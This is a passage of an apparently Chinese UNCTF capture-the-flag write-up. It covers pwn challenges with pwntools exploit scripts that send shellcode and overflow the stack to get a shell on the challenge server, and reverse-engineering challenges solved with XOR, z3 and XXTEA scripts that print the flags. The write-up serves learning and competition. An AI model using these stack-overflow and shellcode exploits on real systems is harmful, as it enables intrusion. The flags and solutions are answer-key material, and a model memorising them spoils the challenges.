class="keyword">ssize_t</span> <span class="title">read_shell_code</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_shell_code()</code> 将输入的shellcode写入bss段 <code>buf</code> 区域，再通过 <code>read()</code> 实现ret2shellcode。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">34717</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;show me your Migic\n&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.recvline()</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-int"><a href="#magic-int" class="headerlink" title="magic_int"></a>magic_int</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_400959, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = -v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      EDG();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">EDG</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c中int取值范围为 -2147483648 ~ +2147483647，而 -2147483648 刚好为取反发生上溢的数，传入即可进入 <code>EDG()</code>，再ret2text。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38780</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400781</span></span><br><span class="line">r.send(<span class="string">&#x27;-2147483648\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x77</span> + p64(backdoor)</span><br><span class="line">r.send(pay)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-abs"><a href="#magic-abs" class="headerlink" title="magic_abs"></a>magic_abs</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">92</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+6Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">time_t</span> timer; <span class="comment">// [rsp+70h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = time(&amp;timer);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  v11 = read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me your a g e:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your lucky number?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  v10 = abs32(v5);</span><br><span class="line">  v9 = (<span class="keyword">int</span>)(v10 + v11);</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi,%s And see you next time!\n&quot;</span>, s);</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Recording...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v13 = rand() % (((<span class="keyword">int</span>)abs32(v5 + v7) &gt;&gt; v7) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = rand() % <span class="number">10000</span>;</span><br><span class="line">  record(s, v5, v13, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n name: %s \n lucky number: %d \n tag: %d\n DOWN!\n&quot;</span>, a1, a2, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest[a3], a1, v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, a1, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造 <code>v7</code> 和 <code>v5</code>，使得 <code>(((int)abs32(v5 + v7) &gt;&gt; v7) + 1)</code> 为1，<code>v13</code> 不再随机只能取0，在 <code>record()</code> 中，输入的 <code>s</code> 作为payload复制到 <code>dest</code> 区域，造成栈溢出。</p><p>本地测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">-2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">int</span>)v5); <span class="comment">//-2147483647</span></span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,((<span class="keyword">int</span>)(v5+v7))&gt;&gt;v7); <span class="comment">//0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">36236</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">backdoor_addr = <span class="number">0x4009D7</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor_addr)</span><br><span class="line">r.send(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;2147483647&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483647&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><blockquote><p>程序流程识别，算法逆向</p></blockquote><p><code>login()</code> 中 <code>pqsd`fl&#123;zmpZsag&#125;wdYVkUNC</code> 与 <code>0x16</code> 异或得到 <code>fgervpzml&#123;fLewqkarO@&#125;CXU</code>，再8位一组上下排列，从上往下取出连成：<code>flag&#123;refOrL@ve&#125;pwCzqXmkU</code>。</p><p>flag：<code>flag&#123;refOrL@ve&#125;</code></p><p>​    </p><h3 id="rejunk"><a href="#rejunk" class="headerlink" title="rejunk"></a>rejunk</h3><blockquote><p>垃圾代码混淆，异或算法逆向</p></blockquote><p>查看伪代码发现夹进很多垃圾代码，跟进几行有用的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input your answer:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v14);</span><br><span class="line"><span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%s%s%s%s&quot;</span>, <span class="string">&quot;WQGUL&quot;</span>, <span class="string">&quot;xb&gt;2:&quot;</span>, <span class="string">&quot;ooh95=&quot;</span>, <span class="string">&quot;&#x27;&#x27;twk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( (v9 ^ (v14[v9] + <span class="number">2</span>)) != Buffer[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>脚本逆解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;</span>)</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t.append((s[i]^i)-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>UNCTF&#123;b781cbb29054db&#125;</code></p><p>​    </p><h3 id="py-trade"><a href="#py-trade" class="headerlink" title="py_trade"></a>py_trade</h3><blockquote><p>EZ opcode! Give me your PY, and i’ll give you flag!</p></blockquote><p>还原python字节码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">num = [<span class="number">0</span>]*<span class="number">18</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    num[i] = (<span class="built_in">ord</span>(flag[i])+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    num[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (<span class="built_in">ord</span>(flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>])+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]</span></span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">num = [<span class="number">115</span>, <span class="number">120</span>, <span class="number">96</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">128</span>, <span class="number">95</span>, <span class="number">124</span>, <span class="number">139</span>, <span class="number">49</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num))]</span><br><span class="line">res = [-<span class="number">1</span>]*<span class="built_in">len</span>(num)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    res[i] = (flag[i]+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    res[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>]+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    s.add(res[i]==num[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[i].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># py_Trad3_1s_fuNny!</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;py_Trad3_1s_fuNny!&#125;</code></p><p>​    </p><h3 id="ezDriver"><a href="#ezDriver" class="headerlink" title="ezDriver"></a>ezDriver</h3><blockquote><p>你了解过驱动嘛？试试看吧！</p></blockquote><p>分析逻辑，<code>DriverEntry()</code> -&gt; <code>sub_140086000()</code> -&gt; <code>sub_140085268()</code> -&gt; <code>sub_140085000()</code> -&gt; <code>sub_140085020()</code>。</p><p>主程序逻辑在 <code>sub_140085020()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140085020</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">void</span> *Address, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-828h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">2048</span>]; <span class="comment">// [rsp+30h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001640(v10, <span class="number">0</span>i64, <span class="number">2048</span>i64);</span><br><span class="line">  ProbeForRead(Address, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)Address);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, a2);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v10);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v4 &lt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140083090[v4] = v10[<span class="number">4</span> * v4];</span><br><span class="line">    LODWORD(v9) = ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001000(byte_140083090, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_140003028, &amp;unk_140003030);<span class="comment">// XXTEA加密</span></span><br><span class="line">  v5 = <span class="number">-1</span>i64;</span><br><span class="line">  v6 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v6;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140003000[v6] );</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140083090[v5] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140003000[v8] != byte_140083090[v8] )<span class="comment">// 比较</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      HIDWORD(v9) = ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] you are right@&quot;</span>, byte_140003000, v9);</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">    sub_140001380(v10, Address, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag Wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现通过加密函数 <code>sub_140001000()</code> 后，得到的结果 <code>byte_140083090</code> 与 <code>byte_140003000</code> 作比较。</p><p>跟进加密函数 <code>sub_140001000()</code>，由特征知为XXTEA加密算法，使用的key为 <code>unk_140003030=[1,2,3,4]</code>。</p><p>脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * 